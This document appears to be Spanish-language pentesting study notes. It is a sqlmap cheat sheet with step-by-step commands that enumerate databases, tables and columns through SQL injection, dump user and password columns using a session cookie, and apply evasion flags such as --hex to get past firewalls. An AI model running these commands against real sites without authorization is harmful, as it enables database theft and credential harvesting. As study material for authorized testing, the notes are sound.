-------------------
- Tags: #sqli #sql #owasp #tools #software 
--------------

# Definicion

*sqlmap es una utilidad de software para el descubrimiento automatizado de vulnerabilidades de inyección SQL en aplicaciones web*
- Miroslav Stampar, creador de SQLMap.

## Uso:

### Una vez detectada una posible vuln SQLI:

- Parametro **-u**  para especificar url ( con el payload a atacar ), y parametro **--dbs**, para listar BD existentes
```bash
sqlmap -u 'url.com/index.php?id=1' --dbs
```

---------

- En el caso de necesitar autenticarnos para ver la url con el posible campo vulnerable a **sqli**, es necesario arrastrar la **cookie** de sesion *Ejemplo:*
```bash
sqlmap -u 'url.com/index.php?id=1' --dbs --cookie "PHPSESSID=cookiedeejemplo"
```

--------------------------

- Si ya conocemos que BD se esta usando (**MySql por ejemplo**), podemos especificarlo, esto con el fin de que el script no ejecute tantas peticiones incesesarias
```bash
sqlmap -u 'url.com/index.php?id=1' --dbs --cookie "PHPSESSID=cookiedeejemplo" --dbms mysql
```

-------------------

- Parametro **-batch**, tiene como funcion dar la respuesta por default automaticamente, el tipico (**Yes/no**), tomará la opcion que tiene **Mayusculas**
```bash
****sqlmap -u 'url.com/index.php?id=1' --dbs --cookie "PHPSESSID=cookiedeejemplo" --dbms mysql --batch
```

--------------------

- Una vez dumpeadas las bases de Datos, Hacemos uso de alguna con el parametro **-D** y parametro **tables** para ver que tablas tiene
```bash
sqlmap -u 'url.com/index.php?id=1' --cookie "PHPSESSID=cookiedeejemplo" --dbms mysql --batch -D nombreDB --tables
```

-------------

- Ahora para ver **COLUMNAS**, hacemos uso de la **tabla** con el parametro **-T** y luego poenmos parametro **--columns** para ver las columnas de dicha tabla
```bash
sqlmap -u 'url.com/index.php?id=1' --cookie "PHPSESSID=cookiedeejemplo" --dbms mysql --batch -D nombreDB -T nombreTabla --columns
```

---------

- Por ultimo para **DUMPEAR** las columnas y datos de la BD con el parametro **-C** especificamos la columna y por ultimo **--dump** para obtener los datos
```bash
sqlmap -u 'url.com/index.php?id=1' --cookie "PHPSESSID=cookiedeejemplo" --dbms mysql --batch -D nombreDB -T nombreTabla -C users,password,id --dump
```

---------------
### Parametros evacion de seguridad :

El parámetro `--no-cast` se utiliza para indicarle a SQLMap que no realice conversiones automáticas de tipos de datos durante la inyección de SQL. Por defecto, SQLMap intenta realizar conversiones de tipo para aprovechar las vulnerabilidades de inyección de SQL de manera más efectiva. Sin embargo, si deseas desactivar esta funcionalidad y obtener resultados más precisos, puedes utilizar `--no-cast`.

El parámetro `--hex` se utiliza para indicarle a SQLMap que codifique las solicitudes SQL inyectadas utilizando la notación hexadecimal. Al codificar las consultas SQL de esta manera, SQLMap puede evitar la detección de ciertos mecanismos de seguridad y firewalls, ya que los caracteres especiales y los operadores SQL se representan como valores hexadecimales. Esto puede ayudar a evadir ciertas defensas de seguridad, pero no es efectivo en todos los casos.

El parametro`--no-escape`: Esta opción desactiva el mecanismo de escapado de cadenas (string escaping) en SQLMap. Por defecto, SQLMap realiza el escapado automático de las cadenas para evitar problemas de sintaxis y permitir la inyección de SQL correcta. Sin embargo, al utilizar `--no-escape`, SQLMap no escapará las cadenas automáticamente, lo que puede ser útil si se desea realizar pruebas específicas donde el escapado automático puede interferir con la inyección de SQL o se quiera evaluar el impacto de un ataque de inyección de SQL sin ningún tipo de mitigación o modificación automática de las cadenas inyectadas.

En resumen, al utilizar `--no-cast`, SQLMap no realizará conversiones automáticas de tipos de datos, y al utilizar `--hex`, SQLMap codificará las solicitudes SQL inyectadas en notación hexadecimal. Estas opciones pueden ser útiles en diferentes situaciones dependiendo del objetivo de la prueba de penetración y la configuración de seguridad de la aplicación web objetivo.




